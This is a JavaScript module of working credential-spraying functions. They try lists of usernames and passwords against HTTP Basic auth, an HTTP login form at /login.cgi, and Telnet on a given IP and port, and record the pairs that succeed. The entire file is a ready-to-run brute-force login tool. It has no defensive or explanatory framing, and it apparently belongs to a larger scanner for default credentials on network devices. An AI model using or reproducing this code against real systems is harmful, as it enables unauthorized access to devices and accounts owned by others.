import net from 'net';

export const sleep = (ms) => process.env.NODE_ENV === 'test' ? Promise.resolve() : new Promise(resolve => setTimeout(resolve, ms));

export async function sprayHttpBasic(ip, port, credentials, signal, delayMs, timeoutMs) {
  const hits = [];
  for (const { user, pass } of credentials) {
    if (signal.aborted) throw new Error('Aborted');

    await sleep(delayMs);

    const authHeader = 'Basic ' + Buffer.from(`${user}:${pass}`).toString('base64');
    const targetUrl = `http://${ip}:${port}/`;

    try {
      const response = await fetch(targetUrl, {
        method: 'GET',
        headers: {
          'Authorization': authHeader
        },
        signal: signal.aborted ? null : AbortSignal.timeout(timeoutMs) // Use fetch's native timeout or the main abort signal
      });

      if (response.status >= 200 && response.status < 300) {
        // Success
        hits.push({ user, pass, evidence: `HTTP ${response.status} OK (was 401)` });
      } else if (response.status === 401 || response.status === 403) {
        // Expected failure
      } else {
        // Might be a redirect or server error, we'll just log and continue for now
      }
    } catch (err) {
      if (err.name === 'AbortError' || err.message === 'Aborted') {
         if (signal.aborted) throw new Error('Aborted'); // Re-throw if it was manually aborted
         break; // It was a timeout from AbortSignal.timeout, so break internal loop
      } else if (err.code === 'ECONNREFUSED' || err.cause?.code === 'ECONNREFUSED' || err.message.includes('fetch failed')) {
        break; // Connection refused or dropped, stop hitting this port
      }
    }
  }
  return hits;
}

export async function sprayHttpForm(ip, port, opts, credentials, signal, delayMs, timeoutMs) {
  const hits = [];
  const targetPath = '/login.cgi';
  const targetUrl = `http://${ip}:${port}${targetPath}`;

  for (const { user, pass } of credentials) {
    if (signal.aborted) throw new Error('Aborted');
    await sleep(delayMs);

    const postData = `username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;

    try {
      const response = await fetch(targetUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: postData,
        signal: signal.aborted ? null : AbortSignal.timeout(timeoutMs),
        redirect: 'manual' // We want to capture the 301/302 as success indicator sometimes
      });

      if (response.status === 302 || response.status === 301 || response.status === 200) {
          
        let isSuccess = true;
        if (response.status === 200) {
            // Heuristic check for 200 OK forms
            const body = await response.text();
            if (body.toLowerCase().includes('incorrect') || body.toLowerCase().includes('invalid')) {
                isSuccess = false;
            }
        }
        
        if (isSuccess) {
            hits.push({ user, pass, evidence: `HTTP ${response.status} Success/Redirect on form` });
        }
      } 
    } catch(err) {
      if (err.name === 'AbortError' || err.message === 'Aborted') {
          if (signal.aborted) throw new Error('Aborted');
          break; // Fetch timeout
      }
      break; // Other fatal error
    }
  }
  return hits;
}

export async function sprayTelnet(ip, port, credentials, signal, delayMs, timeoutMs) {
  const hits = [];

  for (const { user, pass } of credentials) {
    if (signal.aborted) throw new Error('Aborted');
    await sleep(delayMs);

    try {
      const result = await new Promise((resolve) => {
        const socket = new net.Socket();
        let buffer = '';
        let phase = 'login'; // 'login', 'password', 'done'

        socket.setTimeout(timeoutMs);

        socket.on('data', (data) => {
          buffer += data.toString('utf8');
          const lowerBuf = buffer.toLowerCase();

          if (phase === 'login' && (lowerBuf.includes('login') || lowerBuf.includes('user'))) {
            socket.write(user + '\r\n');
            buffer = '';
            phase = 'password';
          } else if (phase === 'password' && (lowerBuf.includes('password') || lowerBuf.includes('pass'))) {
            socket.write(pass + '\r\n');
            buffer = '';
            phase = 'done';
          } else if (phase === 'done') {
            if (lowerBuf.match(/[#\$>%](\s)?$/)) { 
               resolve({ success: true, evidence: `Telnet prompt matched: ${lowerBuf.trim().slice(-10)}` });
               socket.destroy();
            } else if (lowerBuf.includes('incorrect') || lowerBuf.includes('invalid') || lowerBuf.includes('failed')) {
               resolve({ success: false });
               socket.destroy();
            }
          }
        });

        socket.on('error', () => resolve({ success: false, abort: true })); 
        socket.on('timeout', () => { socket.destroy(); resolve({ success: false, abort: true }); });
        socket.on('close', () => resolve({ success: false })); 

        signal.addEventListener('abort', () => socket.destroy());
        socket.connect(port, ip);
      });

      if (result.success) {
        hits.push({ user, pass, evidence: result.evidence });
        // Assume opts.stopOnFirstHit is handled by the orchestrator loop, we just return the array
      } else if (result.abort) {
        break; 
      }

    } catch(err) {
        break;
    }
  }
  return hits;
}
